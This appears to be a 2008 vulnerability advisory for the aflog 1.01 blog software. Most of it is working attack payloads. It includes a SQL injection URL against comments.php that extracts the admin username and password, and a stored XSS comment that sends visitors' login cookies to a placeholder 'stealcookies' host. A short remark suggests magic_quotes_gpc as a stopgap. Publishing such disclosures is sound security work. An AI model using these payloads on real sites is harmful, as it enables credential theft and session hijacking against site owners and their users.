aflog 1.01 comments.php XSS / SQL Injection Vulnerability
=========================================================




# Name: aflog 1.01 (and possibly earlier)
# Webiste: http://aflog.org/
# Vulnerability type: SQL Injection (comments.php) and XSS
# Author:
#         shinmai, 2008-01-22
###############################################################################
# Description:
#
# SQL INJECTION:
#
# SQL injection is possible in comments.php for the GET variable &#039;id&#039;, like
# this:
http://hostname/aflog/comments.php?id=&#039;[SQLI]/*
# The following POC exposes the username and password of the first registered
# user (the admin):

http://localhost/aflog/comments.php?id=&#039;+UNION+SELECT+666,null,concat(&#039;username:&#039;,username,&#039;,password:&#039;,password),1,null,1+FROM+members+ORDER+BY+id+DESC+LIMIT+1/*

#
# The same principle could be applied to view.php, but forming the SQL
# injection string is easier in comments.php, IMHO.
#
# NOTE:
# A possible sollution to this is setting magic_quotes_gpc to "on" but this is
# viable to cause other problems, so a patch to aflog would be more benefitial.
#
###############################################################################
#
# XSS
#
# The comment form doesn&#039;t do much parsing on comments posted, other than their
# length.
#
# A newly registered user can easily compose an URL with an XSS exploit and
# trick a logged in user to click it to steal their login cookie.
#
#   Example comment:

Don&#039;t go <script>var a="<a
href=&#039;http://server/stealcookies?"+encodeURI(document.cookie)+"&#039;>here</a>";document.write(a);</script>.

#
# Cliking this link would send the login cookie as a GET request to &#039;server&#039; to
# be processed by a script called &#039;stealcookies&#039;
#
# Good luck, and be safe. Greetings to the light of my life, innoscent.
#



